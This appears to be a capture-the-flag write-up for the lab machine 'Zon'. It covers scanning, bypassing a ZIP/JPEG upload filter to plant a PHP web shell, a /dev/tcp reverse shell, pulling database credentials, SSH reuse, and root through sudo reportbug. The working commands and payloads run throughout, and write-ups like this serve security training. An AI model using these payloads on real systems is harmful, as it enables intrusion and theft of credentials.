# Zon

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.120:22
Open 10.0.2.120:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.120
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: zon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

Outgoing HTML links, but no file exists.

![writeup.png](/assets/pentest/hackmyvm/zon/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.120 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.eot,.otf -n -r -x .php
200      GET        1l        2w       13c http://10.0.2.120/report.php
200      GET        5l      478w    45479c http://10.0.2.120/js/jquery.mCustomScrollbar.concat.min.js
200      GET      240l      669w    12490c http://10.0.2.120/blog.php
200      GET       15l       49w      741c http://10.0.2.120/uploads/
200      GET      208l      534w    10538c http://10.0.2.120/about.php
200      GET        7l      570w    50676c http://10.0.2.120/js/bootstrap.min.js
200      GET      245l      608w    12239c http://10.0.2.120/service.php
200      GET      229l      567w    11753c http://10.0.2.120/contact.php
200      GET      511l     1445w    29170c http://10.0.2.120/
200      GET      511l     1445w    29170c http://10.0.2.120/index.php
200      GET       40l      300w     6323c http://10.0.2.120/fonts/
200      GET       15l       49w      735c http://10.0.2.120/icon/
200      GET       28l      172w     3369c http://10.0.2.120/images/
200      GET        7l      896w    70808c http://10.0.2.120/js/bootstrap.bundle.min.js
200      GET        5l     1287w    87088c http://10.0.2.120/js/jquery.min.js
200      GET      153l      449w     4306c http://10.0.2.120/js/custom.js
200      GET        7l      277w    44342c http://10.0.2.120/js/owl.carousel.min.js
200      GET      213l     1380w    11324c http://10.0.2.120/js/jquery-3.0.0.min.js
200      GET      105l      230w     2716c http://10.0.2.120/js/slider-setting.js
200      GET        6l      352w    19190c http://10.0.2.120/js/popper.min.js
200      GET     6433l    20653w   210612c http://10.0.2.120/js/bootstrap.bundle.js
200      GET       26l      157w     3083c http://10.0.2.120/js/
200      GET      291l      870w    17014c http://10.0.2.120/testimonial.php
200      GET       68l      154w     1908c http://10.0.2.120/choose.php
```

### Upload Bypass

![writeup-1.png](/assets/pentest/hackmyvm/zon/writeup-1.png)

Only `JPEG` (not JPG) is allowed. I wasn't able to find any wordlists to fuzz this so I made some combinations of what I knew.
```bash
└─$ head ~/Pictures/usb.jpg > usb.jpeg.php
└─$ echo '<?php if(isset($_REQUEST[0])){system($_REQUEST[0]);}; ?>' >> usb.jpeg.php
└─$ cp usb.jpg.php 'usb.php%00.jpeg'
└─$ cp usb.jpeg.php 'usb.jpeg.php.'
└─$ cp usb.jpeg.php 'usb.jpeg .php'
└─$ for file in *; do echo $file; rm letmein.zip 2>/dev/null; zip -r letmein.zip $file; curl 'http://10.0.2.120/upload.php' -F 'submit=Upload ZIP' -F 'fileToUpload=@./letmein.zip'; echo $'\n-----'; done;
usb.jpeg .php
  adding: usb.jpeg .php (deflated 29%)
File letmein.zip has been uploaded.
-----
usb.jpeg.php
  adding: usb.jpeg.php (deflated 29%)
File letmein.zip has been uploaded.Archive contains non-JPEG files. It will be deleted.
-----
usb.jpeg.php.
  adding: usb.jpeg.php. (deflated 29%)
File letmein.zip has been uploaded.Archive contains non-JPEG files. It will be deleted.
-----
usb.php%00.jpeg
  adding: usb.php%00.jpeg (deflated 29%)
File letmein.zip has been uploaded.
-----
```

```bash
└─$ curl 'http://10.0.2.120/uploads/usb.jpeg%20.php' -d '0=id' -so- | tail -1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

```bash
└─$ curl 'http://10.0.2.120/uploads/usb.jpeg%20.php' --data-urlencode '0=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'
---
└─$ penelope -p 4444
www-data@zon:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Source:
```php
www-data@zon:/var/www/html$ cat upload.php
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;

$extension = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
$finfo = new finfo(FILEINFO_MIME_TYPE);
$fileMimeType = $finfo->file($_FILES["fileToUpload"]["tmp_name"]);

if ($extension != "zip" || $fileMimeType != "application/zip") {
    echo "Only ZIP files are allowed.";
    $uploadOk = 0;
}

if ($uploadOk == 0) {
    echo "Sorry, your file has not been uploaded.";
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.";

        $command = "unzip -l " . escapeshellarg($target_file) . " | awk '{print $4}' | grep -v \"\\.jpeg$\" | grep . | tail -n1 | grep \"\\.\"";
        exec($command, $output, $return_var);

        if ($return_var == 0) {
            echo "Archive contains non-JPEG files. It will be deleted.";
            unlink($target_file);
        } else {
            $command = escapeshellcmd("unzip -o $target_file -d $target_dir");
            exec($command, $output, $return_var);
            unlink($target_file);
            if ($return_var != 0) {
                echo "Sorry, an error occurred while decompressing your file.";
            }
        }
    } else {
        echo "Sorry, your file has not been uploaded.";
    }
}
?>
```

#### MySQL

```bash
www-data@zon:/var/www/html$ cat hashDB.sh
...
/usr/bin/mysqldump -u admin -pudgrJbFc6Av#U3 admin credentials > "${dump}"
...
```

```bash
www-data@zon:/var/www/html$ mysql -u'admin' -p'udgrJbFc6Av#U3' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| admin              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
www-data@zon:/var/www/html$ mysql -u'admin' -p'udgrJbFc6Av#U3' admin -e 'SHOW TABLES;'
+-----------------+
| Tables_in_admin |
+-----------------+
| credentials     |
+-----------------+
www-data@zon:/var/www/html$ mysql -u'admin' -p'udgrJbFc6Av#U3' admin -e 'SELECT * FROM credentials;'
+----------+-------------------------+
| username | password                |
+----------+-------------------------+
| Freddie  | LDVK@dYiEa2I1lnjrEeoMif |
+----------+-------------------------+
```

```bash
www-data@zon:/var/www/html$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
freddie:x:1000:1000:,,,:/home/freddie:/bin/zsh
```

## SSH

```bash
└─$ sshpass -p 'LDVK@dYiEa2I1lnjrEeoMif' ssh freddie@10.0.2.120
╰─$ id
uid=1000(freddie) gid=1000(freddie) groups=1000(freddie),100(users)
```

### User.txt

```bash
╰─$ cat user.txt
a0b4603c7fde7e4113d2ee5fbee5a038
```

## Privilege Escalation

```bash
╰─$ sudo -l
sudo: unable to resolve host zon: Name or service not known
Matching Defaults entries for freddie on zon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddie may run the following commands on zon:
    (ALL : ALL) NOPASSWD: /usr/bin/reportbug
```

```bash
╰─$ sudo reportbug --configure                                                                                                                                                                                1 ↵
sudo: unable to resolve host zon: Name or service not known
Please choose the default operating mode for reportbug.

1 novice    Offer simple prompts, bypassing technical questions.

2 standard  Offer more extensive prompts, including asking about things that a moderately sophisticated user would be expected to know about Debian.

3 advanced  Like standard, but assumes you know a bit more about Debian, including "incoming".

4 expert    Bypass most handholding measures and preliminary triage routines. This mode should not be used by people unfamiliar with Debian's policies and operating procedures.

Select mode: [novice]
Will reportbug often have direct Internet access? (You should answer yes to this question unless you know what you are doing and plan to check whether duplicate reports have been filed via some other channel.)
[y|N|q|?]?
What real name should be used for sending bug reports?
[root]>
Which of your email addresses should be used when sending bug reports? (Note that this address will be visible in the bug tracking system, so you may want to use a webmail address or another address with good
spam filtering capabilities.)
[let@me.in]>
Do you have a "mail transport agent" (MTA) like Exim, Postfix or SSMTP configured on this computer to send mail to the Internet [y|N|q|?]?
Please enter the name of your SMTP host. Usually it's called something like "mail.example.org" or "smtp.example.org". If you need to use a different port than default, use the <host>:<port> alternative format.
Just press ENTER if you don't have one or don't know, and so a Debian SMTP host will be used.
>
Please enter the name of your proxy server. It should only use this parameter if you are behind a firewall. The PROXY argument should be formatted as a valid HTTP URL, including (if necessary) a port number;
for example, http://192.168.1.1:3128/. Just press ENTER if you don't have one or don't know.
>
Default preferences file written.  To reconfigure, re-run reportbug with the "--configure" option.
```

```bash
╭─freddie@zon ~
╰─$ sudo reportbug
sudo: unable to resolve host zon: Name or service not known
Running 'reportbug' as root is probably insecure! Continue [y|N|q|?]? y
Please enter the name of the package in which you have found a problem, or type 'other' to report a more general problem. If you don't know what package the bug is in, please contact debian-
user@lists.debian.org for assistance.
> other
Please enter the name of the package in which you have found a problem, or choose one of these bug categories:

 1 bugs.debian.org          The bug tracking system, @bugs.debian.org
...
39 www.debian.org           Problems with the WWW site

Enter a package: 1
Are you reporting a problem with this program (reportbug) [Y|n|q|?]?
*** Welcome to reportbug.  Use ? for help at prompts. ***
Note: bug reports are publicly archived (including the email address of the submitter).
Detected character set: UTF-8
Please change your locale if this is incorrect.

Using 'root <let@me.in>' as your from address.
Getting status for reportbug...
Will send report to Debian (per lsb_release).
Maintainer for reportbug is 'Reportbug Maintainers <debian-reportbug@lists.debian.org>'.
Looking up dependencies of reportbug...
Getting status for related package python3-reportbug...
Looking up 'depends' of related package python3-reportbug...
Looking up 'suggests' of related package python3-reportbug...
Getting changed configuration files...

###
EDITOR SHOULD OPEN UP HERE
TYPE -> !/bin/bash <- TO SPAWN SHELL
###

root@zon:/home/freddie# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@zon:/home/freddie# cat /root/root.txt
18a72aa09ce61fb487fd6745c8eba769
```